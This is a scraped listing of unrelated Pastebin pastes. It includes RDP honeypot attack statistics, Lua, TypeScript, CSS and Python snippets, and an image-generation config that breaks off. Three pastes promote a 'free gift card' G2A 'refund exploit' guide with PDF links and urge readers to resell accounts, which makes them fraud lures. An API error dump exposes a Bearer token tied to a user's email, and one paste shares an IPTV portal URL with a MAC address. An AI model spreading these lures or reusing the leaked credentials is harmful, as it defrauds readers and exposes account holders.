id,title,username,language,date,content
EFjFHTmN,2024-03-16_stats.json,rdp_snitch,JSON,Saturday 16th of March 2024 07:16:09 PM CDT,"{
  ""ip"": {
    ""167.172.216.246"": 8,
    ""68.183.102.140"": 2,
    ""179.60.147.135"": 2,
    ""45.227.254.26"": 8,
    ""58.218.204.183"": 6,
    ""87.251.75.145"": 8,
    ""205.210.31.52"": 6,
    ""194.165.16.37"": 4,
    ""71.6.135.131"": 2,
    ""128.199.73.121"": 376,
    ""87.251.75.64"": 2,
    ""80.66.88.215"": 2,
    ""62.204.41.123"": 12,
    ""103.240.6.155"": 6,
    ""212.70.149.142"": 6,
    ""80.66.76.92"": 6,
    ""185.170.144.3"": 4,
    ""167.71.171.237"": 2,
    ""198.235.24.88"": 6,
    ""5.8.10.202"": 4,
    ""120.240.145.8"": 2,
    ""194.165.16.11"": 4,
    ""152.32.199.33"": 2,
    ""104.248.120.201"": 8,
    ""173.230.147.247"": 2,
    ""205.210.31.161"": 6,
    ""43.226.39.53"": 2552,
    ""185.180.143.8"": 2,
    ""103.77.209.24"": 6,
    ""103.72.57.134"": 6,
    ""118.193.56.171"": 2,
    ""205.210.31.169"": 6,
    ""167.248.133.50"": 2,
    ""45.227.254.48"": 4
  },
  ""asn"": {
    ""AS14061"": 396,
    ""AS209588"": 2,
    ""AS267784"": 12,
    ""AS4134"": 6,
    ""AS208091"": 18,
    ""AS396982"": 24,
    ""AS48721"": 8,
    ""AS10439"": 2,
    ""AS59425"": 12,
    ""AS151853"": 6,
    ""AS204428"": 6,
    ""AS197414"": 4,
    ""AS34665"": 4,
    ""AS56040"": 2,
    ""AS135377"": 4,
    ""AS63949"": 2,
    ""AS134762"": 2552,
    ""AS211680"": 2,
    ""AS150897"": 6,
    ""AS150892"": 6,
    ""AS398324"": 2
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 396,
    ""Flyservers S.A."": 22,
    ""Chinanet"": 6,
    ""Xhost Internet Solutions LP"": 20,
    ""Google LLC"": 24,
    ""CariNet, Inc."": 2,
    ""Xhost Internet Solutions"": 2,
    ""Horizon LLC"": 12,
    ""Giza Network Limited"": 6,
    ""SS-Net"": 6,
    ""Petersburg Internet Network ltd"": 4,
    ""China Mobile communications corporation"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 4,
    ""Akamai Technologies, Inc."": 2,
    ""CHINANET Liaoning province Dalian MAN network"": 2552,
    ""NSEC - Sistemas Informaticos, S.A."": 2,
    ""Azplay Technology Company Limited"": 6,
    ""Gold VPS Limited"": 6,
    ""Censys, Inc."": 2
  },
  ""org"": {
    ""DigitalOcean, LLC"": 396,
    ""Cloud Solutions S.A"": 2,
    ""UAB Host Baltic"": 12,
    ""Chinanet JS"": 6,
    ""Xhost Internet Solutions"": 16,
    ""Palo Alto Networks, Inc"": 24,
    ""Flyservers S.A"": 8,
    ""CariNet, Inc."": 2,
    ""XHOSTIS"": 2,
    ""Horizon LLC"": 12,
    ""Giza Network Limited"": 6,
    ""4Media Ltd"": 6,
    ""Xhostis"": 4,
    ""PIN DC"": 4,
    ""China Mobile"": 2,
    ""Ucloud Information Technology (hk) Limited"": 4,
    ""Linode"": 2,
    ""Shenzhen Qianhai bird cloud computing Co. Ltd."": 2552,
    ""ICG 1 Inap"": 2,
    ""Azplay Technology Company Limited"": 6,
    ""Gold VPS Limited"": 6,
    ""Censys, Inc."": 2
  },
  ""regionName"": {
    ""California"": 36,
    ""New Jersey"": 12,
    ""Distrito Federal"": 2,
    ""Vilnius"": 12,
    ""Jiangsu"": 6,
    ""North Holland"": 20,
    ""Kaunas"": 8,
    ""South West"": 376,
    ""Drenthe"": 2,
    ""Moscow"": 12,
    ""Ho Chi Minh"": 12,
    ""Plovdiv"": 6,
    ""St.-Petersburg"": 4,
    ""Guangdong"": 2554,
    ""Sao Paulo"": 2,
    ""Illinois"": 2,
    ""\u00ecnh \u0110\u1ecbnh Province"": 6,
    ""Bangkok"": 2,
    ""Michigan"": 2
  },
  ""country"": {
    ""United States"": 52,
    ""Venezuela"": 2,
    ""Lithuania"": 20,
    ""China"": 2560,
    ""The Netherlands"": 22,
    ""Singapore"": 376,
    ""Russia"": 16,
    ""Vietnam"": 18,
    ""Bulgaria"": 6,
    ""Brazil"": 2,
    ""Thailand"": 2
  },
  ""account"": {
    ""w63prjqz"": 8,
    ""beio"": 4,
    ""Administr"": 30,
    ""Test"": 28,
    ""hello"": 24,
    ""PEpwDPiRn"": 2,
    ""HNsRje"": 2,
    ""rijVSr"": 2,
    ""root"": 2,
    ""Administrator"": 98,
    ""Admin"": 94,
    ""Whatuptime.com"": 94,
    ""Jakartakini123#"": 94,
    ""BezEuJR"": 2,
    ""OuSShzXWF"": 2,
    ""wgwlll"": 2,
    ""ZgHhAE"": 2,
    ""(empty)"": 8,
    ""Domain"": 4,
    ""5444kna1"": 8,
    ""IcNXJdVkd"": 2,
    ""WqyynP"": 2,
    ""lITtpY"": 2,
    ""NCRACK_USER"": 2552,
    ""6fr5moe1"": 2,
    ""mRagpMaAJ"": 2,
    ""qhDJGk"": 2,
    ""PCvtYS"": 2
  },
  ""keyboard"": {
    ""Unknown"": 3076
  },
  ""client_build"": {
    ""Unknown"": 3076
  },
  ""client_name"": {
    ""Unknown"": 3076
  },
  ""ip_type"": {
    ""hosting & proxy"": 10,
    ""Unknown"": 2646,
    ""hosting"": 418,
    ""mobile"": 2
  }
}"
yCMEC583,2024-03-16_stats.json,rdp_snitch,JSON,Saturday 16th of March 2024 07:15:08 PM CDT,"{
  ""ip"": {
    ""167.172.216.246"": 4,
    ""68.183.102.140"": 1,
    ""179.60.147.135"": 1,
    ""45.227.254.26"": 4,
    ""58.218.204.183"": 3,
    ""87.251.75.145"": 4,
    ""205.210.31.52"": 3,
    ""194.165.16.37"": 2,
    ""71.6.135.131"": 1,
    ""128.199.73.121"": 188,
    ""87.251.75.64"": 1,
    ""80.66.88.215"": 1,
    ""62.204.41.123"": 6,
    ""103.240.6.155"": 3,
    ""212.70.149.142"": 3,
    ""80.66.76.92"": 3,
    ""185.170.144.3"": 2,
    ""167.71.171.237"": 1,
    ""198.235.24.88"": 3,
    ""5.8.10.202"": 2,
    ""120.240.145.8"": 1,
    ""194.165.16.11"": 2,
    ""152.32.199.33"": 1,
    ""104.248.120.201"": 4,
    ""173.230.147.247"": 1,
    ""205.210.31.161"": 3,
    ""43.226.39.53"": 1276,
    ""185.180.143.8"": 1,
    ""103.77.209.24"": 3,
    ""103.72.57.134"": 3,
    ""118.193.56.171"": 1,
    ""205.210.31.169"": 3,
    ""167.248.133.50"": 1,
    ""45.227.254.48"": 2
  },
  ""asn"": {
    ""AS14061"": 198,
    ""AS209588"": 1,
    ""AS267784"": 6,
    ""AS4134"": 3,
    ""AS208091"": 9,
    ""AS396982"": 12,
    ""AS48721"": 4,
    ""AS10439"": 1,
    ""AS59425"": 6,
    ""AS151853"": 3,
    ""AS204428"": 3,
    ""AS197414"": 2,
    ""AS34665"": 2,
    ""AS56040"": 1,
    ""AS135377"": 2,
    ""AS63949"": 1,
    ""AS134762"": 1276,
    ""AS211680"": 1,
    ""AS150897"": 3,
    ""AS150892"": 3,
    ""AS398324"": 1
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 198,
    ""Flyservers S.A."": 11,
    ""Chinanet"": 3,
    ""Xhost Internet Solutions LP"": 10,
    ""Google LLC"": 12,
    ""CariNet, Inc."": 1,
    ""Xhost Internet Solutions"": 1,
    ""Horizon LLC"": 6,
    ""Giza Network Limited"": 3,
    ""SS-Net"": 3,
    ""Petersburg Internet Network ltd"": 2,
    ""China Mobile communications corporation"": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Akamai Technologies, Inc."": 1,
    ""CHINANET Liaoning province Dalian MAN network"": 1276,
    ""NSEC - Sistemas Informaticos, S.A."": 1,
    ""Azplay Technology Company Limited"": 3,
    ""Gold VPS Limited"": 3,
    ""Censys, Inc."": 1
  },
  ""org"": {
    ""DigitalOcean, LLC"": 198,
    ""Cloud Solutions S.A"": 1,
    ""UAB Host Baltic"": 6,
    ""Chinanet JS"": 3,
    ""Xhost Internet Solutions"": 8,
    ""Palo Alto Networks, Inc"": 12,
    ""Flyservers S.A"": 4,
    ""CariNet, Inc."": 1,
    ""XHOSTIS"": 1,
    ""Horizon LLC"": 6,
    ""Giza Network Limited"": 3,
    ""4Media Ltd"": 3,
    ""Xhostis"": 2,
    ""PIN DC"": 2,
    ""China Mobile"": 1,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""Linode"": 1,
    ""Shenzhen Qianhai bird cloud computing Co. Ltd."": 1276,
    ""ICG 1 Inap"": 1,
    ""Azplay Technology Company Limited"": 3,
    ""Gold VPS Limited"": 3,
    ""Censys, Inc."": 1
  },
  ""regionName"": {
    ""California"": 18,
    ""New Jersey"": 6,
    ""Distrito Federal"": 1,
    ""Vilnius"": 6,
    ""Jiangsu"": 3,
    ""North Holland"": 10,
    ""Kaunas"": 4,
    ""South West"": 188,
    ""Drenthe"": 1,
    ""Moscow"": 6,
    ""Ho Chi Minh"": 6,
    ""Plovdiv"": 3,
    ""St.-Petersburg"": 2,
    ""Guangdong"": 1277,
    ""Sao Paulo"": 1,
    ""Illinois"": 1,
    ""\u00ecnh \u0110\u1ecbnh Province"": 3,
    ""Bangkok"": 1,
    ""Michigan"": 1
  },
  ""country"": {
    ""United States"": 26,
    ""Venezuela"": 1,
    ""Lithuania"": 10,
    ""China"": 1280,
    ""The Netherlands"": 11,
    ""Singapore"": 188,
    ""Russia"": 8,
    ""Vietnam"": 9,
    ""Bulgaria"": 3,
    ""Brazil"": 1,
    ""Thailand"": 1
  },
  ""account"": {
    ""w63prjqz"": 4,
    ""beio"": 2,
    ""Administr"": 15,
    ""Test"": 14,
    ""hello"": 12,
    ""PEpwDPiRn"": 1,
    ""HNsRje"": 1,
    ""rijVSr"": 1,
    ""root"": 1,
    ""Administrator"": 49,
    ""Admin"": 47,
    ""Whatuptime.com"": 47,
    ""Jakartakini123#"": 47,
    ""BezEuJR"": 1,
    ""OuSShzXWF"": 1,
    ""wgwlll"": 1,
    ""ZgHhAE"": 1,
    ""(empty)"": 4,
    ""Domain"": 2,
    ""5444kna1"": 4,
    ""IcNXJdVkd"": 1,
    ""WqyynP"": 1,
    ""lITtpY"": 1,
    ""NCRACK_USER"": 1276,
    ""6fr5moe1"": 1,
    ""mRagpMaAJ"": 1,
    ""qhDJGk"": 1,
    ""PCvtYS"": 1
  },
  ""keyboard"": {
    ""Unknown"": 1538
  },
  ""client_build"": {
    ""Unknown"": 1538
  },
  ""client_name"": {
    ""Unknown"": 1538
  },
  ""ip_type"": {
    ""hosting & proxy"": 5,
    ""Unknown"": 1323,
    ""hosting"": 209,
    ""mobile"": 1
  }
}"
en2aNMzY,G2A.com Free Gift Card Guide Mar 2024 FIX,HastyBasher0,GetText,Saturday 16th of March 2024 07:09:25 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

IMPORTANT: If you use this make sure to use the English version of G2A.com otherwise this will not work!

You can buy gift cards directly with it or you can buy popular games then put them on fresh steam accounts and then sell those accounts.
 
PDF guide here:
https://smallpdf.com/file#s=cea149fd-ead1-4939-94cf-d10a8ce7936a
 
Working as of:
17 March 2024















































"
rf5zLc9V,chunkloader,Zeehao,Lua,Saturday 16th of March 2024 07:06:23 PM CDT,"local component = require(""component"")
local event = require(""event"")

os.execute(""clear"")

local cl = component.chunkerloader
cl.setActive(true)
while event.pull(1, ""interrupted"")  == nil do 
    print(""Is Active: "" .. tostring(cl.isActive())
    if cl.isActive() == false then
        os.execute(""reboot"")
    end
end"
2yV3KSbH,🤑 G2A.com Free Gift Card Guide Mar 2024 🤑,ssss50w,GetText,Saturday 16th of March 2024 06:18:40 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
IMPORTANT: If you use this make sure to use the English version of G2A.com otherwise this will not work!
 
You can buy gift cards directly with it or you can buy popular games then put them on fresh steam accounts and then sell those accounts.
 
PDF guide here:
https://smallpdf.com/file#s=bbac6a4c-491e-4d6d-9e1e-906db1161a87
 
Working as of:
16 March 2024











































"
3ZqhbFCE,Untitled,arbora,TypeScript,Saturday 16th of March 2024 06:13:46 PM CDT,"import { createHash } from 'crypto'
import axios from 'axios'
import { ICreateRoboxCheckoutRequest } from '@luaroxa/contracts'
import RoboxWebhook from './robox.webhook.dto'

type RoboxConfig = {
  shopIdentifier: string
  password1: string
  password2: string
  testMode: boolean
}

export default class Robokaska {
  private shopIdentifier: string
  private password1: string
  private password2: string
  private testMode: boolean

  constructor(config: RoboxConfig) {
    const { shopIdentifier, password1, password2, testMode = false } = config

    this.shopIdentifier = shopIdentifier
    this.password1 = password1
    this.password2 = password2
    this.testMode = testMode
  }

  md5(input: string) {
    return createHash('md5').update(input).digest('hex')
  }

  async createPayUrl(dto: ICreateRoboxCheckoutRequest): Promise<{
    id: string
    url: string
  }> {
    const InvId = ''

    const signature = this.md5(
      `${this.shopIdentifier}:${dto.amount}:${InvId}:${this.password1}:Shp_id=${dto.checkoutId}`,
    )

    const payload = {
      MerchantLogin: this.shopIdentifier,
      OutSum: dto.amount.toString(),
      InvId,
      Shp_id: dto.checkoutId,
      SignatureValue: signature,
    }

    const url = 'https://auth.robokassa.ru/Merchant/Indexjson.aspx?'

    const response = await axios.post(
      url,
      new URLSearchParams(payload).toString(),
      {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      },
    )
    console.log('response.data', response.data)
    if (response.data.error) {
      throw new Error(JSON.stringify(response.data.error))
    }
    return {
      id: response.data.invoiceID,
      url: `https://auth.robokassa.ru/Merchant/Index/${response.data.invoiceID}`,
    }
  }

  checkPay(dto: RoboxWebhook) {
    // const sigSrc = `${Math.round(parseInt(dto.OutSum))}:${dto.InvId}:${this.password2}:Shp_id=${dto.Shp_id}`
    // const sigSrc = `${dto.OutSum}:${dto.InvId}:${this.password2}:Shp_id=${dto.Shp_id}`
    // const sigSrc = `${dto.OutSum}::${this.password2}:Shp_id=${dto.Shp_id}`
    // const sigSrc = `${dto.OutSum}:${dto.InvId}:${this.password2}`
    const sigSrc = `${dto.OutSum}:${dto.InvId}:${this.password2}:Shp_id=${dto.Shp_id}`
    const sig = this.md5(sigSrc)

    console.debug('checkPay', dto)
    console.debug('checkPay to md5', sigSrc)
    console.debug('checkPay: compare', dto.SignatureValue.toUpperCase(), sig)

    return dto.SignatureValue.toUpperCase() === sig.toUpperCase()
  }
}
"
ypWgU7c2,🤑 G2A.com Free Gift Card Guide Mar 2024 FIX 🤑,ounnuo,GetText,Saturday 16th of March 2024 06:12:32 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

If you use this make sure to use the English version of G2A.com otherwise this will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_600217.pdf

Working as of:
16 March 2024"
4zYA4dJG,Error on setting change,iko1133,JSON,Saturday 16th of March 2024 05:50:57 PM CDT,"{
	""config"": {
		""adapter"": [""xhr"", ""http""],
		""baseURL"": ""https://devheyeyapi.azurewebsites.net/api/"",
		""data"": ""{\""settingId\"":1,\""value\"":\""false\""}"",
		""env"": {
			""Blob"": [Function Blob],
			""FormData"": [Function FormData]
		},
		""headers"": [Object],
		""maxBodyLength"": -1,
		""maxContentLength"": -1,
		""method"": ""put"",
		""timeout"": 0,
		""transformRequest"": [
			[Function transformRequest]
		],
		""transformResponse"": [
			[Function transformResponse]
		],
		""transitional"": {
			""clarifyTimeoutError"": false,
			""forcedJSONParsing"": true,
			""silentJSONParsing"": true
		},
		""url"": ""users/10/settings/1"",
		""validateStatus"": [Function validateStatus],
		""xsrfCookieName"": ""XSRF-TOKEN"",
		""xsrfHeaderName"": ""X-XSRF-TOKEN""
	},
	""data"": {
		""Message"": ""The property 'UserSetting.UserId' is part of a key and so cannot be modified or marked as modified. To change the principal of an existing entity with an identifying foreign key, first delete the dependent and invoke 'SaveChanges', and then associate the dependent with the new principal."",
		""StatusCode"": 500
	},
	""headers"": {
		""cache-control"": ""no-cache,no-store"",
		""content-type"": ""application/json"",
		""date"": ""Sat, 16 Mar 2024 22:19:08 GMT"",
		""expires"": ""-1"",
		""pragma"": ""no-cache"",
		""server"": ""Microsoft-IIS/10.0"",
		""x-powered-by"": ""ASP.NET""
	},
	""request"": {
		""DONE"": 4,
		""HEADERS_RECEIVED"": 2,
		""LOADING"": 3,
		""OPENED"": 1,
		""UNSENT"": 0,
		""_aborted"": false,
		""_cachedResponse"": undefined,
		""_hasError"": false,
		""_headers"": {
			""accept"": ""application/json"",
			""authorization"": ""Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6ImViYzIwNzkzNTQ1NzExODNkNzFjZWJlZDI5YzU1YmVmMjdhZDJjY2IiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vZGV2aGV5ZXkiLCJhdWQiOiJkZXZoZXlleSIsImF1dGhfdGltZSI6MTcwOTkwODU1NiwidXNlcl9pZCI6IldLQUpreFQwV0tkQkdlZmRFU3F4NTdQNVNmYjIiLCJzdWIiOiJXS0FKa3hUMFdLZEJHZWZkRVNxeDU3UDVTZmIyIiwiaWF0IjoxNzEwNjI1MDQ2LCJleHAiOjE3MTA2Mjg2NDYsImVtYWlsIjoiZGVtbzIwQGdtYWlsLmNvbSIsImVtYWlsX3ZlcmlmaWVkIjpmYWxzZSwiZmlyZWJhc2UiOnsiaWRlbnRpdGllcyI6eyJlbWFpbCI6WyJkZW1vMjBAZ21haWwuY29tIl19LCJzaWduX2luX3Byb3ZpZGVyIjoicGFzc3dvcmQifX0.N75rCFV3RXistg6yaxAf4Tb4WFpj93vUE1gVvZmr5MKRdOkZ-LoRbQm0OhDq1FPpXAQ8QqdpnOpTZfyrHQlm3gmY4UeXxYsLFyo6M4w9ToMMH1idRdS80ESJWlkstUmhOb3xDgKtC1HL5PrLqWdpgYY90CTGhHy7reaxrmxHJvRov1IUIXm3hqY7ziPDALbm6WOJSARYtF_IyOy1edylfDLAH_rkYjqNNc6dpziKsOtyF7-gaelnRTvgqRxdSBbl7W2tTYhhyhIVOV-zD-2bfoX_pOYRPVJnrGpYwnai5fgyoWQ1QVpLfkOKWnB7ZmI5p7ETZ9bmdk9LdwkZ33EWmQ"",
			""content-type"": ""application/json-patch+json"",
			""x-requested-with"": ""XMLHttpRequest""
		},
		""_incrementalEvents"": false,
		""_lowerCaseResponseHeaders"": {
			""cache-control"": ""no-cache,no-store"",
			""content-type"": ""application/json"",
			""date"": ""Sat, 16 Mar 2024 22:19:08 GMT"",
			""expires"": ""-1"",
			""pragma"": ""no-cache"",
			""server"": ""Microsoft-IIS/10.0"",
			""x-powered-by"": ""ASP.NET""
		},
		""_method"": ""PUT"",
		""_perfKey"": ""network_XMLHttpRequest_https://devheyeyapi.azurewebsites.net/api/users/10/settings/1"",
		""_performanceLogger"": {
			""_closed"": false,
			""_extras"": [Object],
			""_pointExtras"": [Object],
			""_points"": [Object],
			""_timespans"": [Object]
		},
		""_requestId"": null,
		""_response"": ""{\""StatusCode\"":500,\""Message\"":\""The property \\u0027UserSetting.UserId\\u0027 is part of a key and so cannot be modified or marked as modified. To change the principal of an existing entity with an identifying foreign key, first delete the dependent and invoke \\u0027SaveChanges\\u0027, and then associate the dependent with the new principal.\""}"",
		""_responseType"": """",
		""_sent"": true,
		""_subscriptions"": [],
		""_timedOut"": false,
		""_trackingName"": ""unknown"",
		""_url"": ""https://devheyeyapi.azurewebsites.net/api/users/10/settings/1"",
		""readyState"": 4,
		""responseHeaders"": {
			""Cache-Control"": ""no-cache,no-store"",
			""Content-Type"": ""application/json"",
			""Date"": ""Sat, 16 Mar 2024 22:19:08 GMT"",
			""Expires"": ""-1"",
			""Pragma"": ""no-cache"",
			""Server"": ""Microsoft-IIS/10.0"",
			""x-powered-by"": ""ASP.NET""
		},
		""responseURL"": ""https://devheyeyapi.azurewebsites.net/api/users/10/settings/1"",
		""status"": 500,
		""timeout"": 0,
		""upload"": {},
		""withCredentials"": true
	},
	""status"": 500,
	""statusText"": undefined
}"
Ca17NVqG,PORTAL-FLIXTVON,brunoflix,XML,Saturday 16th of March 2024 05:44:29 PM CDT,"portal""http://4u.eagle4u.org:8080/""
00:1A:79:03:1E:30"
u1jAnUjB,webinar-exam-review-v4-2023-03-16,jspill,Python,Saturday 16th of March 2024 05:19:06 PM CDT,"# Exam Review 2024 Mar 16

# Do those LABS
# Ch 2-14... all Labs!
# Ch 21-32 just ADDITIONAL LABS, but important practice!
# get to know the Prac Tests, Ch 33 and 34... more than the Pre

# Use Submit Mode and get them to 100%!!!
# PAY ATTENTION to the unit tests!
# ... then UNIT TEST more! Unit test, unit test, unit test!

# When you've gotten the Ch 33-34 Prac Tests to 100, go back and do each again.
# This time, try to think of 2-3 more unit tests that could be run on each question.

# Comp 1: Basic syntax and knowledge: operators, data types, etc
# Comp 2: Control Flow
# Comp 3: Modules and Files

# Comp 1: Basic syntax and knowledge: operators, data types, etc
# Operators
# = # assignment
# == # asking a question
# +
# -
# *
# /
# % # modulo... whole number remainder... ""how many whole things didn't fit since the last even division?""
# // # floor division... last even division
# <
# >
# <=
# >=
# += # x += 1 --> x = x+1
# -=
# ** # pow(), math.pow()
# !=
# # keywords
# in # membership check... if x in myList:
# not # if not x in myList:
# and
# or # any one True would cause the combo is True... limit OR to 2-3 conditions

# Data Types/Classes
# int
# float
# bool
# str # """"
# list # [ ]
# dict # {key: value}, review Ch 4.5
# tuple # ( ) immutable, Python sees x,y,z as (x,y,z) -> return a,b,c --> return (a,b,c)
# set # {x,y,z} no duplicates, no order --> no indices, can't slice it, can't sort it, can't reverse it
# range # range()... container of consecutive numbers
# file # open()... f.read(), f.readlines(), f.write()

# Comp 2
# Control Flow! The how and when of our programs
# IF statements... if, if/else, if/elif, if/elif/else
# LOOPS
# WHILE - a general purpose loop, an IF that repeats
# FOR - repeating action once for everything in a container
# FOR - repeating actions a known number of times -> once for everything in a container
# Check out my For Loops webinar in The Gotchas
# for ___ in _someContainer_:
# for item in myList:
# for char in myStr:
# for key in myDict: # value for that key in myDict[key]
# for n in range(5):
# for i in range(0, len(myList)):
# for i, item in enumerate(myList):

# FUNCTIONS
# defining/writing a function vs calling it
# modular... a function has ONE job
# output/print vs return (or maybe something)
# parameters are special variables for holding stuff coming into the function
# parameters vs arguments
#
# def someFunction(x, y):
#     return x ** y
#
# if __name__ == ""__main__"": # is this script the one that's running now
#     input1 = int(input())
#     input2 = int(input())
#     myNum = someFunction(input1, input2)
#     print(myNum)

# final ""task"" page of Ch 10, 11, 13, 14
# CodingBat also has good function-based Python questions:
# https://codingbat.com/python

# BUILT-IN FUNCTIONS
# input()
# print()
# range()
# pow()
# type() # print(type(myVar).__name__)
# list()
# str()
# int()
# float()
# len()
# sum()
# min()
# max()
# enumerate()
# open()
# round() # cousins math.ceil(), math.floor()
# abs() # math.fabs(), ""magnitude""
# help()
# dir() # # print(dir(str))
# help(str) # help(str.isspace)

# STRINGS
# be able to refer to indices, and slice
# myStr = ""abcdef""
# # mySlice[start:stop:step]
# revStr = myStr[::-1]
# print(revStr)

# KNOW YOUR WHITESPACE
# "" "" # space from spacebar
# # a lot of Unicode spaces
# ""\n"" # new line return
# ""\t"" # tab
# ""\r"" # carriage return

# myVar = input().strip()

# unless otherwise stated... printed output should end a new line return... 99% of the time it does anyway
# print(""hey"") # --> print(""hey"", end=""\n"")
# we only need to change that when...
#1 ... this specific says to do something else
#2 ... you yourself overrode the end parameter of print() as the last thing you did... just call print() after that block

# STRING METHODS
# myStr.format() # ""Stuff I want to put this {} and {} together in a string"".format(val1, val2)
# myStr.strip() # input().strip()
# myStr.split() # returns a list of smaller strings
# "","".join(listOfStrings)
# myStr.replace(subStr, newStr) # ""remove"" myStr = myStr.replace(subStr, """")
# myStr.index(subStr), myStr.find(subStr) # return index location
# myStr.count(subStr) # returns number of times it's there
# case: lower(), upper(), title(), capitalize()
# is/Boolean: isspace(), isupper(), islower(), isalpha(), isnumeric(), isdigit(), isalnum()
# myStr.startswith(subStr), endswith(subStr)

# LISTS
# be able to refer by index and to slice
# LIST METHODS
# +
# myList.append(item)
# myList.insert(i, item)
# myList.extend(anotherList)
# # -
# myList.pop(i) # last one or by index
# myList.remove(item) # pop() by index, remove() by value
# myList.clear()
# # other
# myList.sort()
# myList.reverse()
# myList.count(item) # returns int count of item
# myList.copy()
# myList.index(item)

# DICT
# use the key like an index []... then you don't really need DICT methods
# myDict[key] # get the value for that key
# myDict[key] = value # assigns new value to key
#
# # DICT METHODS
# myDict.keys() # all dict keys in a set-like object
# myDict.values() # all dict values in a set-like object

# check if key in dict
# if ___ in myDict: # checking the keys

# MODULES
# math and csv

# MATH MODULE
# import math # FULL IMPORT
# math.factorial(x)
# math.ceil(x)
# math.floor(x)
# math.sqrt(x)
# math.pow(x, y)
# math.fabs(x)
# math.pi
# math.e
#
# # PARTIAL IMPORT
# from math import ceil # just ceil(), no math.
# from math import factorial, sqrt # factorial(), sqrt()
# from math import * # floor(), sqrt()
#
# # ALIAS IMPORT
# import math as m
# m.floor(), m.ceil()

# FILES
# modes: r, w, a

# READ MODE
# filename = input()
with open(""test.txt"", ""r"") as f:
    # f.read()  # returns whole file as one big string
    # f.readline() # singular! I stay away from this one
    # f.readlines()  # returns a list of strings, line by line
    # f.write() # take one str arg and write into file (can't do here bc I'm in read mode)
    contents = f.readlines()
# print(contents)
# for line in contents:
#     line = line.strip()
#     print(line)

# CSV module
import csv # csv.reader()
with open(""mock_data.csv"", ""r"") as f1: # mockaroo.com
    # contents = f1.readlines()
    contents = list(csv.reader(f1)) # csv.reader(f1, delimiter=""\t"")

# print(contents)

# WRITE MODE
# with open(""output_data35.csv"", ""w"") as f2:
#     # write out a file from contents where emails are from Yahoo
#     for row in contents:
#         # email is row[3]
#         if row[3].endswith(""@yahoo.com""):
#             f2.write("","".join(row) + ""\n"")

# APPEND MODE
# with open(""append_to_this.txt"", ""r"") as f3:
#     print(f3.readlines())
with open(""append_to_this.txt"", ""a"") as f3:
    f3.write(""\nPippin"")

"
qbQyMYEh,Untitled,s-sols,CSS,Saturday 16th of March 2024 05:05:51 PM CDT,"body.single-product:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .woocommerce-product-gallery__wrapper {
	position: relative;
	overflow: visible !important;
	width: 100% !important;
	--thmb-height: 65px;
}

body.single-product:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .woocommerce-product-gallery__image:first-of-type .attachment-shop_thumbnail {
	aspect-ratio: 5 / 6;
}

body.single-product:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .woocommerce-product-gallery__image:nth-of-type(1n + 2) {
	position: absolute;
	left: -70px;
	top: -0%;
	width: 55px !important;
	height: auto;
	padding: 5px 0;
}

body.single-product:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .woocommerce-product-gallery__image:nth-of-type(2) {
	padding-top: 0;
}

body.single-product:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .woocommerce-product-gallery__image:nth-of-type(3) {
	top: calc(var(--thmb-height) * 1);
}

body.single-product:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .woocommerce-product-gallery__image:nth-of-type(4) {
	top: calc(var(--thmb-height) * 2);
}

body.single-product:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .woocommerce-product-gallery__image:nth-of-type(5) {
	top: calc(var(--thmb-height) * 3);
}

body.single-product:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .woocommerce-product-gallery__image:nth-of-type(6) {
	top: calc(var(--thmb-height) * 4);
}

body.single-product:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .woocommerce-product-gallery__image:nth-of-type(7) {
	top: calc(var(--thmb-height) * 5);
}

body.single-product:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .woocommerce-product-gallery__image:nth-of-type(8) {
	top: calc(var(--thmb-height) * 6);
}


body.single-product:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .woocommerce-product-gallery__image:nth-of-type(1n + 2) .attachment-shop_thumbnail {
	aspect-ratio: 1 / 1;
	object-fit: cover;
	border: 1px solid #d9d9d9;
}

body.single-product:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .woocommerce-product-gallery .flex-control-nav.flex-control-thumbs {
	opacity: 1 !important;
}
"
3cef2pUg,Untitled,alastair87,JSON,Saturday 16th of March 2024 04:49:42 PM CDT,"{
    ""numOutputsTotal"": 1,
    ""seed"": 3428304345,
    ""reqBody"": {
        ""prompt"": ""Madame Web, a wise old spider woman, with intricate webs covering her body, detailed face with multiple eyes, elegant spinnerets, glistening fangs, realistic fur and texture, photorealistic, expertly lit, 4k quality"",
        ""negative_prompt"": ""ugly, low resolution, bad anatomy, too many fingers, extra arms, extra legs, boring graphics, poor lighting, dark, cartoons, childish, simple, no details, unrealistic, (worst quality, low quality), deformed, grotesque, (3d, 2d painting, illustration), black and white"",
        ""active_tags"": [],
        ""inactive_tags"": [],
        ""width"": 1024,
        ""height"": 1024,
        ""seed"": 3428304345,
        ""num_inference_steps"": 25,
        ""guidance_scale"": 7.5,
